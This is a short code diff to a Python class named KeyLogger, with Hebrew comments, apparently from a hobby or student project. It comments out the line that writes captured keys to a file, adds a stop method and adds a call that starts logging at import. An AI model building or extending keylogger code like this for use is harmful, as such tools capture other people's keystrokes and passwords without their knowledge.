@@ -22,7 +22,7 @@ class KeyLogger(IKeyLogger):
         key_nise = KeyLogger.nurmal_key(Key)
         print(key_nise)
         # לתקן את הדרך
-        FileWriter().write(key_nise)
+        # FileWriter().write(key_nise)
 
         # פןנקציה שמפסיקה את התוכנה אם לחץ על קונטרול שיפט d
     @staticmethod
@@ -58,6 +58,9 @@ class KeyLogger(IKeyLogger):
             else:
                 return key_list[1]
 
+    def stop_logging(self) -> None:
+        sys.exit(0)
 
+KeyLogger().start_logging()
 
 
